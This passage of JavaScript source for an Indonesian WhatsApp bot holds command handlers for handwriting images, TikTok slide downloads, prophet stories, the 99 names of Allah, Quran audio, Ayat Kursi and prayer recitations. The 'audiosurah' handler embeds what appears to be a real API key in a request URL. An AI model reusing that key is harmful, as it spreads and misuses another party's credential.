    if(!text) return reply('iya kak,  mau nulis apa? untuk menulis caranya begini ya\n> .nulis nama|kelas|teks yang mau ditulis')
    nama = text.split('|')[0] ? text.split('|')[0] : '-'
    kelas = text.split('|')[1] ? text.split('|')[1] : '-'
    nulis = text.split('|')[2] ? text.split('|')[2] : '-'
    RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
    try {
    RyuuBotz.sendMessage(m.chat, { image: { url: `https://api.siputzx.my.id/api/m/nulis?text=${encodeURIComponent(nulis)}&name=${encodeURIComponent(nama)}&class=${encodeURIComponent(kelas)}` }, caption: 'berhasil..' }, { quoted: m })
    } catch {
      reply('yah Error kak laporankan ke owner agar di perbaiki')
    }
  }
break;
case 'ttslide': case 'tiktokslide':{
if (!text) return replyreinz(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZSL36LfEP/`)
RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://btch.us.kg/download/tiktokslide?url=${encodeURIComponent(text)}`)
for (let img of anu.result.images) {
  await RyuuBotz.sendMessage(m.chat, { image: { url: img }, caption: anu.result.title }, { quoted: m })
}
await RyuuBotz.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})
} catch (error) {
await RyuuBotz.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
//=========================================\\
case 'kisahnabi': {
     if (!text) return replyReinzID(`Masukan nama nabi\nContoh: kisahnabi adam`)
     let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
     let kisah = await url.json().catch(_ => "Error")
     if (kisah == "Error") return replyReinzID("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")
     
    let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`

     replyReinzID(`${hasil}`)

}
break
//=========================================\\
const contoh = `*Asmaul Husna*
`
// data here
const anjuran = `
Dari Abu hurarirah radhiallahu anhu, Rasulullah Saw bersabda: "إِنَّ لِلَّهِ تَعَالَى تِسْعَةً وَتِسْعِينَ اسْمًا، مِائَةٌ إِلَّا وَاحِدًا، مَنْ أَحْصَاهَا دخل الجنة، وهو وتر يُحِبُّ الْوِتْرَ"
Artinya: "Sesungguhnya Allah mempunyai sembilan puluh sembilan nama, alias seratus kurang satu. Barang siapa yang menghitung-hitungnya, niscaya masuk surga; Dia Witir dan menyukai yang witir".`

case 'asmaulhusna': {
const asmaulhusna = [
    {
        index: 1,
        latin: "Ar Rahman",
        arabic: "الرَّحْمَنُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemurah",
        translation_en: "The All Beneficent"
    },
    {
        index: 2,
        latin: "Ar Rahiim",
        arabic: "الرَّحِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Penyayang",
        translation_en: "The Most Merciful"
    },
    {
        index: 3,
        latin: "Al Malik",
        arabic: "الْمَلِكُ",
        translation_id: "Yang Memiliki Mutlak sifat Merajai/Memerintah",
        translation_en: "The King, The Sovereign"
    },
    {
        index: 4,
        latin: "Al Quddus",
        arabic: "الْقُدُّوسُ",
        translation_id: "Yang Memiliki Mutlak sifat Suci",
        translation_en: "The Most Holy"
    },
    {
        index: 5,
        latin: "As Salaam",
        arabic: "السَّلاَمُ",
        translation_id: "Yang Memiliki Mutlak sifat Memberi Kesejahteraan",
        translation_en: "Peace and Blessing"
    },
    {
        index: 6,
        latin: "Al Mu’min",
        arabic: "الْمُؤْمِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Memberi Keamanan",
        translation_en: "The Guarantor"
    },
    {
        index: 7,
        latin: "Al Muhaimin",
        arabic: "الْمُهَيْمِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemelihara",
        translation_en: "The Guardian, the Preserver"
    },
    {
        index: 8,
        latin: "Al ‘Aziiz",
        arabic: "الْعَزِيزُ",
        translation_id: "Yang Memiliki Mutlak Kegagahan",
        translation_en: "The Almighty, the Self Sufficient"
    },
    {
        index: 9,
        latin: "Al Jabbar",
        arabic: "الْجَبَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Perkasa",
        translation_en: "The Powerful, the Irresistible"
    },
    {
        index: 10,
        latin: "Al Mutakabbir",
        arabic: "الْمُتَكَبِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat Megah,Yang Memiliki Kebesaran",
        translation_en: "The Tremendous"
    },
    {
        index: 11,
        latin: "Al Khaliq",
        arabic: "الْخَالِقُ",
        translation_id: "Yang Memiliki Mutlak sifat Pencipta",
        translation_en: "The Creator"
    },
    {
        index: 12,
        latin: "Al Baari’",
        arabic: "الْبَارِئُ",
        translation_id: "Yang Memiliki Mutlak sifat Yang Melepaskan(Membuat, Membentuk, Menyeimbangkan)",
        translation_en: "The Maker"
    },
    {
        index: 13,
        latin: "Al Mushawwir",
        arabic: "الْمُصَوِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMembentuk Rupa (makhluknya)",
        translation_en: "The Fashioner of Forms"
    },
    {
        index: 14,
        latin: "Al Ghaffaar",
        arabic: "الْغَفَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Pengampun",
        translation_en: "The Ever Forgiving"
    },
    {
        index: 15,
        latin: "Al Qahhaar",
        arabic: "الْقَهَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Memaksa",
        translation_en: "The All Compelling Subduer"
    },
    {
        index: 16,
        latin: "Al Wahhaab",
        arabic: "الْوَهَّابُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemberi Karunia",
        translation_en: "The Bestower"
    },
    {
        index: 17,
        latin: "Ar Razzaaq",
        arabic: "الرَّزَّاقُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemberi Rejeki",
        translation_en: "The Ever Providing"
    },
    {
        index: 18,
        latin: "Al Fattaah",
        arabic: "الْفَتَّاحُ",
        translation_id: "Yang Memiliki Mutlak sifat Pembuka Rahmat",
        translation_en: "The Opener, the Victory Giver"
    },
    {
        index: 19,
        latin: "Al ‘Aliim",
        arabic: "اَلْعَلِيْمُ",
        translation_id: "Yang Memiliki Mutlak sifatMengetahui (Memiliki Ilmu)",
        translation_en: "The All Knowing, the Omniscient"
    },
    {
        index: 20,
        latin: "Al Qaabidh",
        arabic: "الْقَابِضُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMenyempitkan (makhluknya)",
        translation_en: "The Restrainer, the Straightener"
    },
    {
        index: 21,
        latin: "Al Baasith",
        arabic: "الْبَاسِطُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMelapangkan (makhluknya)",
        translation_en: "The Expander, the Munificent"
    },
    {
        index: 22,
        latin: "Al Khaafidh",
        arabic: "الْخَافِضُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMerendahkan (makhluknya)",
        translation_en: "The Abaser"
    },
    {
        index: 23,
        latin: "Ar Raafi’",
        arabic: "الرَّافِعُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMeninggikan (makhluknya)",
        translation_en: "The Exalter"
    },
    {
        index: 24,
        latin: "Al Mu’izz",
        arabic: "الْمُعِزُّ",
        translation_id: "Yang Memiliki Mutlak sifat YangMemuliakan (makhluknya)",
        translation_en: "The Giver of Honor"
    },
    {
        index: 25,
        latin: "Al Mudzil",
        arabic: "المُذِلُّ",
        translation_id: "Yang Memiliki Mutlak sifatYang Menghinakan (makhluknya)",
        translation_en: "The Giver of Dishonor"
    },
    {
        index: 26,
        latin: "Al Samii’",
        arabic: "السَّمِيعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mendengar",
        translation_en: "The All Hearing"
    },
    {
        index: 27,
        latin: "Al Bashiir",
        arabic: "الْبَصِيرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Melihat",
        translation_en: "The All Seeing"
    },
    {
        index: 28,
        latin: "Al Hakam",
        arabic: "الْحَكَمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menetapkan",
        translation_en: "The Judge, the Arbitrator"
    },
    {
        index: 29,
        latin: "Al ‘Adl",
        arabic: "الْعَدْلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
        translation_en: "The Utterly Just"
    },
    {
        index: 30,
        latin: "Al Lathiif",
        arabic: "اللَّطِيفُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Lembut",
        translation_en: "The Subtly Kind"
    },
    {
        index: 31,
        latin: "Al Khabiir",
        arabic: "الْخَبِيرُ",
        translation_id: "Yang Memiliki Mutlak sifatMaha Mengetahui Rahasia",
        translation_en: "The All Aware"
    },
    {
        index: 32,
        latin: "Al Haliim",
        arabic: "الْحَلِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penyantun",
        translation_en: "The Forbearing, the Indulgent"
    },
    {
        index: 33,
        latin: "Al ‘Azhiim",
        arabic: "الْعَظِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Agung",
        translation_en: "The Magnificent, the Infinite"
    },
    {
        index: 34,
        latin: "Al Ghafuur",
        arabic: "الْغَفُورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pengampun",
        translation_en: "The All Forgiving"
    },
    {
        index: 35,
        latin: "As Syakuur",
        arabic: "الشَّكُورُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaPembalas Budi (Menghargai)",
        translation_en: "The Grateful"
    },
    {
        index: 36,
        latin: "Al ‘Aliy",
        arabic: "الْعَلِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
        translation_en: "The Sublimely Exalted"
    },
    {
        index: 37,
        latin: "Al Kabiir",
        arabic: "الْكَبِيرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Besar",
        translation_en: "The Great"
    },
    {
        index: 38,
        latin: "Al Hafizh",
        arabic: "الْحَفِيظُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menjaga",
        translation_en: "The Preserver"
    },
    {
        index: 39,
        latin: "Al Muqiit",
        arabic: "المُقيِت",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Kecukupan",
        translation_en: "The Nourisher"
    },
    {
        index: 40,
        latin: "Al Hasiib",
        arabic: "الْحسِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMembuat Perhitungan",
        translation_en: "The Reckoner"
    },
    {
        index: 41,
        latin: "Al Jaliil",
        arabic: "الْجَلِيلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The Majestic"
    },
    {
        index: 42,
        latin: "Al Kariim",
        arabic: "الْكَرِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemurah",
        translation_en: "The Bountiful, the Generous"
    },
    {
        index: 43,
        latin: "Ar Raqiib",
        arabic: "الرَّقِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengawasi",
        translation_en: "The Watchful"
    },
    {
        index: 44,
        latin: "Al Mujiib",
        arabic: "الْمُجِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengabulkan",
        translation_en: "The Responsive, the Answerer"
    },
    {
        index: 45,
        latin: "Al Waasi’",
        arabic: "الْوَاسِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Luas",
        translation_en: "The Vast, the All Encompassing"
    },
    {
        index: 46,
        latin: "Al Hakiim",
        arabic: "الْحَكِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maka Bijaksana",
        translation_en: "The Wise"
    },
    {
        index: 47,
        latin: "Al Waduud",
        arabic: "الْوَدُودُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pencinta",
        translation_en: "The Loving, the Kind One"
    },
    {
        index: 48,
        latin: "Al Majiid",
        arabic: "الْمَجِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The All Glorious"
    },
    {
        index: 49,
        latin: "Al Baa’its",
        arabic: "الْبَاعِثُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Membangkitkan",
        translation_en: "The Raiser of the Dead"
    },
    {
        index: 50,
        latin: "As Syahiid",
        arabic: "الشَّهِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menyaksikan",
        translation_en: "The Witness"
    },
    {
        index: 51,
        latin: "Al Haqq",
        arabic: "الْحَقُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Benar",
        translation_en: "The Truth, the Real"
    },
    {
        index: 52,
        latin: "Al Wakiil",
        arabic: "الْوَكِيلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memelihara",
        translation_en: "The Trustee, the Dependable"
    },
    {
        index: 53,
        latin: "Al Qawiyyu",
        arabic: "الْقَوِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kuat",
        translation_en: "The Strong"
    },
    {
        index: 54,
        latin: "Al Matiin",
        arabic: "الْمَتِينُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kokoh",
        translation_en: "The Firm, the Steadfast"
    },
    {
        index: 55,
        latin: "Al Waliyy",
        arabic: "الْوَلِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Melindungi",
        translation_en: "The Protecting Friend, Patron, and Helper"
    },
    {
        index: 56,
        latin: "Al Hamiid",
        arabic: "الْحَمِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Terpuji",
        translation_en: "The All Praiseworthy"
    },
    {
        index: 57,
        latin: "Al Mushii",
        arabic: "الْمُحْصِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengkalkulasi",
        translation_en: "The Accounter, the Numberer of All"
    },
    {
        index: 58,
        latin: "Al Mubdi’",
        arabic: "الْمُبْدِئُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memulai",
        translation_en: "The Producer, Originator, and Initiator of all"
    },
    {
        index: 59,
        latin: "Al Mu’iid",
        arabic: "الْمُعِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMengembalikan Kehidupan",
        translation_en: "The Reinstater Who Brings Back All"
    },
    {
        index: 60,
        latin: "Al Muhyii",
        arabic: "الْمُحْيِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menghidupkan",
        translation_en: "The Giver of Life"
    },
    {
        index: 61,
        latin: "Al Mumiitu",
        arabic: "اَلْمُمِيتُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mematikan",
        translation_en: "The Bringer of Death, the Destroyer"
    },
    {
        index: 62,
        latin: "Al Hayyu",
        arabic: "الْحَيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Hidup",
        translation_en: "The Ever Living"
    },
    {
        index: 63,
        latin: "Al Qayyuum",
        arabic: "الْقَيُّومُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mandiri",
        translation_en: "The Self Subsisting Sustainer of All"
    },
    {
        index: 64,
        latin: "Al Waajid",
        arabic: "الْوَاجِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penemu",
        translation_en: "The Perceiver, the Finder, the Unfailing"
    },
    {
        index: 65,
        latin: "Al Maajid",
        arabic: "الْمَاجِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The Illustrious, the Magnificent"
    },
    {
        index: 66,
        latin: "Al Wahiid",
        arabic: "الْواحِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tunggal",
        translation_en: "The One, The Unique, Manifestation of Unity"
    },
    {
        index: 67,
        latin: "Al ‘Ahad",
        arabic: "اَلاَحَدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Esa",
        translation_en: "The One, the All Inclusive, the Indivisible"
    },
    {
        index: 68,
        latin: "As Shamad",
        arabic: "الصَّمَدُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaDibutuhkan, Tempat Meminta",
        translation_en: "The Self Sufficient, the Impregnable,the Eternally Besought of All, the Everlasting"
    },
    {
        index: 69,
        latin: "Al Qaadir",
        arabic: "الْقَادِرُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMenentukan, Maha Menyeimbangkan",
        translation_en: "The All Able"
    },
    {
        index: 70,
        latin: "Al Muqtadir",
        arabic: "الْمُقْتَدِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Berkuasa",
        translation_en: "The All Determiner, the Dominant"
    },
    {
        index: 71,
        latin: "Al Muqaddim",
        arabic: "الْمُقَدِّمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mendahulukan",
        translation_en: "The Expediter, He who brings forward"
    },
    {
        index: 72,
        latin: "Al Mu’akkhir",
        arabic: "الْمُؤَخِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengakhirkan",
        translation_en: "The Delayer, He who puts far away"
    },
    {
        index: 73,
        latin: "Al Awwal",
        arabic: "الأوَّلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Awal",
        translation_en: "The First"
    },
    {
        index: 74,
        latin: "Al Aakhir",
        arabic: "الآخِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Akhir",
        translation_en: "The Last"
    },
    {
        index: 75,
        latin: "Az Zhaahir",
        arabic: "الظَّاهِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Nyata",
        translation_en: "The Manifest; the All Victorious"
    },
    {
        index: 76,
        latin: "Al Baathin",
        arabic: "الْبَاطِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Ghaib",
        translation_en: "The Hidden; the All Encompassing"
    },
    {
        index: 77,
        latin: "Al Waali",
        arabic: "الْوَالِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memerintah",
        translation_en: "The Patron"
    },
    {
        index: 78,
        latin: "Al Muta’aalii",
        arabic: "الْمُتَعَالِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
        translation_en: "The Self Exalted"
    },
    {
        index: 79,
        latin: "Al Barri",
        arabic: "الْبَرُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penderma",
        translation_en: "The Most Kind and Righteous"
    },
    {
        index: 80,
        latin: "At Tawwaab",
        arabic: "التَّوَابُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penerima Tobat",
        translation_en: "The Ever Returning, Ever Relenting"
    },
    {
        index: 81,
        latin: "Al Muntaqim",
        arabic: "الْمُنْتَقِمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penuntut reply",
        translation_en: "The Avenger"
    },
    {
        index: 82,
        latin: "Al Afuww",
        arabic: "العَفُوُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemaaf",
        translation_en: "The Pardoner, the Effacer of Sins"
    },
    {
        index: 83,
        latin: "Ar Ra`uuf",
        arabic: "الرَّؤُوفُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pengasih",
        translation_en: "The Compassionate, the All Pitying"
    },
    {
        index: 84,
        latin: "Malikul Mulk",
        arabic: "مَالِكُ الْمُلْكِ",
        translation_id: "Yang Memiliki Mutlak sifatPenguasa Kerajaan (Semesta)",
        translation_en: "The Owner of All Sovereignty"
    },
    {
        index: 85,
        latin: "Dzul JalaaliWal Ikraam",
        arabic: "ذُوالْجَلاَلِوَالإكْرَامِ",
        translation_id: "Yang Memiliki Mutlak sifat PemilikKebesaran dan Kemuliaan",
        translation_en: "The Lord of Majesty and Generosity"
    },
    {
        index: 86,
        latin: "Al Muqsith",
        arabic: "الْمُقْسِطُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
        translation_en: "The Equitable, the Requiter"
    },
    {
        index: 87,
        latin: "Al Jamii’",
        arabic: "الْجَامِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengumpulkan",
        translation_en: "The Gatherer, the Unifier"
    },
    {
        index: 88,
        latin: "Al Ghaniyy",
        arabic: "الْغَنِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Berkecukupan",
        translation_en: "The All Rich, the Independent"
    },
    {
        index: 89,
        latin: "Al Mughnii",
        arabic: "الْمُغْنِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Kekayaan",
        translation_en: "The Enricher, the Emancipator"
    },
    {
        index: 90,
        latin: "Al Maani",
        arabic: "اَلْمَانِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mencegah",
        translation_en: "The Withholder, the Shielder, the Defender"
    },
    {
        index: 91,
        latin: "Ad Dhaar",
        arabic: "الضَّارَّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Derita",
        translation_en: "The Distressor, the Harmer"
    },
    {
        index: 92,
        latin: "An Nafii’",
        arabic: "النَّافِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Manfaat",
        translation_en: "The Propitious, the Benefactor"
    },
    {
        index: 93,
        latin: "An Nuur",
        arabic: "النُّورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Bercahaya(Menerangi, Memberi Cahaya)",
        translation_en: "The Light"
    },
    {
        index: 94,
        latin: "Al Haadii",
        arabic: "الْهَادِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Petunjuk",
        translation_en: "The Guide"
    },
    {
        index: 95,
        latin: "Al Baadii",
        arabic: "الْبَدِيعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pencipta",
        translation_en: "Incomparable, the Originator"
    },
    {
        index: 96,
        latin: "Al Baaqii",
        arabic: "اَلْبَاقِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kekal",
        translation_en: "The Ever Enduring and Immutable"
    },
    {
        index: 97,
        latin: "Al Waarits",
        arabic: "الْوَارِثُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pewaris",
        translation_en: "The Heir, the Inheritor of All"
    },
    {
        index: 98,
        latin: "Ar Rasyiid",
        arabic: "الرَّشِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pandai",
        translation_en: "The Guide, Infallible Teacher, and Knower"
    },
    {
        index: 99,
        latin: "As Shabuur",
        arabic: "الصَّبُورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Sabar",
        translation_en: "The Patient"
    }
]
    let json = JSON.parse(JSON.stringify(asmaulhusna))
    let data = json.map((v, i) => `${i + 1}. ${v.latin}\n${v.arabic}\n${v.translation_id}`).join('\n\n')
    if (isNaN(args[0])) return replyReinzID (`contoh:\nasmaulhusna 1`)
    if (args[0]) {
        if (args[0] < 1 || args[0] > 99) throw `minimal 1 & maksimal 99!`
        let { index, latin, arabic, translation_id, translation_en } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
        return replyReinzID(`No. ${index}
${arabic}
${latin}
${translation_id}
${translation_en}
`.trim())
    }
    replyReinzID(`${contoh} + ${data} + ${anjuran}`)
}
break
//=========================================\\
case 'audiosurah': {
	let wrong = `_*Contoh Penggunaan :*_\naudiosurah 1

*List Surah :*
1 : Al-Fatihah
2 : Al-Baqarah
3 : Ali 'Imran
4 : An-Nisa'
5 : Al-Ma'idah
6 : Al-An'am
7 : Al-A’raf
8 : Al-Anfal
9 : At-Taubah
10 : Yunus
11 : Hud
12 : Yusuf
13 : Ar-Ra’d
14 : Ibrahim
15 : Al-Hijr
16 : An-Nahl
17 : Al-Isra'
18 : Al-Kahf
19 : Maryam
20 : Ta Ha
21 : Al-Anbiya
22 : Al-Hajj
23 : Al-Mu’minun
24 : An-Nur
25 : Al-Furqan
26 : Asy-Syu'ara'
27 : An-Naml
28 : Al-Qasas
29 : Al-'Ankabut
30 : Ar-Rum
31 : Luqman
32 : As-Sajdah
33 : Al-Ahzab
34 : Saba’
35 : Fatir
36 : Ya Sin
37 : As-Saffat
38 : Sad
39 : Az-Zumar
40 : Ghafir
41 : Fussilat
42 : Asy-Syura
43 : Az-Zukhruf
44 : Ad-Dukhan
45 : Al-Jasiyah
46 : Al-Ahqaf
47 : Muhammad
48 : Al-Fath
49 : Al-Hujurat
50 : Qaf
51 : Az-Zariyat
52 : At-Tur
53 : An-Najm
54 : Al-Qamar
55 : Ar-Rahman
56 : Al-Waqi’ah
57 : Al-Hadid
58 : Al-Mujadilah
59 : Al-Hasyr
60 : Al-Mumtahanah
61 : As-Saff
62 : Al-Jumu’ah
63 : Al-Munafiqun
64 : At-Tagabun
65 : At-Talaq
66 : At-Tahrim
67 : Al-Mulk
68 : Al-Qalam
69 : Al-Haqqah
70 : Al-Ma’arij
71 : Nuh
72 : Al-Jinn
73 : Al-Muzzammil
74 : Al-Muddassir
75 : Al-Qiyamah
76 : Al-Insan
77 : Al-Mursalat
78 : An-Naba’
79 : An-Nazi’at
80 : 'Abasa
81 : At-Takwir
82 : Al-Infitar
83 : Al-Tatfif
84 : Al-Insyiqaq
85 : Al-Buruj
86 : At-Tariq
87 : Al-A’la
88 : Al-Gasyiyah
89 : Al-Fajr
90 : Al-Balad
91 : Asy-Syams
92 : Al-Lail
93 : Ad-Duha
94 : Al-Insyirah
95 : At-Tin
96 : Al-'Alaq
97 : Al-Qadr
98 : Al-Bayyinah
99 : Az-Zalzalah
100 : Al-'Adiyat
101 : Al-Qari'ah
102 : At-Takasur
103 : Al-'Asr
104 : Al-Humazah
105 : Al-Fil
106 : Quraisy
107 : Al-Ma’un
108 : Al-Kausar
109 : Al-Kafirun
110 : An-Nasr
111 : Al-Lahab
112 : Al-Ikhlas
113 : Al-Falaq
114 : An-Nas`
   if (!text) return replyReinzID(`${wrong}`)
      RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
   RyuuBotz.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${text}?apikey=efcb180d3fd3134748648887` }, mimetype: 'audio/mp4' }, { quoted: m });

}
break
//=========================================\\

case 'ayatkursi': {
  let caption = `
*「 Ayat Kursi 」*
اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”
Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
  replyReinzID(caption)
}
break
//=========================================\\
case 'bacaansholat': {
const bacaanshalat = {
  "result": [
    {
      "id": 1,
      "name": "Bacaan Iftitah",
      "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
      "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
      "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
    },
    {
      "id": 2,
      "name": "Al Fatihah",
